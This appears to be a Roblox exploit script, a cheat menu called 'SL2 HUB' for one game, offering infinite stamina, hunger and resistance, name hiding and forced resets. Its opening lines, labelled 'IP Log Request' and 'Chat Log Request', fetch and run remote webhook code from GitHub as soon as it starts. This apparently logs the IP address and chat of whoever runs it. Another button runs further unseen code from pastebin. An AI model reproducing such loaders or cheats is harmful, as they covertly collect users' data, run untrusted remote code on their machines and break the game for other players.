--// IP Log Request 
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluemanev2/webhookv1/main/webhook.lua"))()

--// Chat Log Request 
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluemanev2/webhookv2/main/webhookv2.lua"))()

--// Global Variables 
getgenv().settings = {
B = false,
C = false, 
E = false, 
F = false, 
G = false, 
H = false, 
I = false,
K = false
}

--// Services 
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

--// Variables 
local Player = Players.LocalPlayer

--// B
function B()
    game:GetService("RunService").RenderStepped:Connect(function()
        game.Players.LocalPlayer.Valuestats.Stamina.Value = 100
    end)
end

--// C 
function C()
    game:GetService("RunService").RenderStepped:Connect(function()
        game.Players.LocalPlayer.Valuestats.Hunger.Value = 100
    end) 
end 

--// E
function E()
game:GetService("RunService").RenderStepped:Connect(function()
        game.Players.LocalPlayer.Character.Resistance.Value = true
    end) 
end 

--// F 
function F()
    game:GetService("Players").LocalPlayer.PlayerGui.Run.Value.Value = true 
end 

--// G 
function G()
    local Teleport = game.TeleportService
    local Player = game.Players.LocalPlayer
    Teleport:Teleport(4779613061, Player)
end 

--// H 
function H()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end 

--// I 
function I()
    if game:GetService("Players").LocalPlayer.Character.Head.Gui then
       game:GetService("Players").LocalPlayer.Character.Head.Gui:Destroy()
    end
end 

--// K 
function K() 
    loadstring(game:HttpGet("https://pastebin.com/raw/mfrMFUcJ"))()
end 

--// Game ID
if game.PlaceId == 4779613061 then 

--// Ui Library 
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

--// Ui Window
local Window = OrionLib:MakeWindow({Name = "SL2 HUB", HidePremium = true, IntroEnabled = false, SaveConfig = true, ConfigFolder = "OrionTest"})

--// Ui Tab
local ATab = Window:MakeTab({
Name = "MAIN",
Icon = "rbxassetid://4483345998",
PremiumOnly = false 
})

--// Ui Tab
local BTab = Window:MakeTab({
Name = "PLAYER",
Icon = "rbxassetid://4483345998",
PremiumOnly = false 
})

--// Ui Tab
local CTab = Window:MakeTab({
Name = "MISC",
Icon = "rbxassetid://4483345998",
PremiumOnly = false 
})

--// Ui Tab Button 
ATab:AddButton({
Name = "INFINITE STAMINA",
Default = false,
Callback = function()
B()
end    
})

--// Ui Tab Button 
ATab:AddButton({
Name = "INFINITE HUNGER",
Default = false,
Callback = function()
C()
end    
})

--// Ui Tab Button 
ATab:AddButton({
Name = "INFINITE RESISTANCE",
Default = false,
Callback = function()
E()
end    
})

--// Ui Tab Button 
ATab:AddButton({
Name = "INFINITE SKITTLES",
Default = false,
Callback = function()
F()
end    
})

--// Ui Tab Button 
ATab:AddButton({
Name = "FREE CAMERA [OP]",
Default = false,
Callback = function()
K()
end    
})

--// Ui Tab Button 
BTab:AddButton({
Name = "HIDE NAME",
Default = false,
Callback = function()
I()
end    
})

--// Ui Tab Button 
CTab:AddButton({
Name = "REJOIN SERVER",
Default = false,
Callback = function()
G()
end    
})

--// Ui Tab Button 
CTab:AddButton({
Name = "FORCE RESET[STILL 60 SECONDS]",
Default = false,
Callback = function()
H()
end    
})

end
OrionLib:Init()
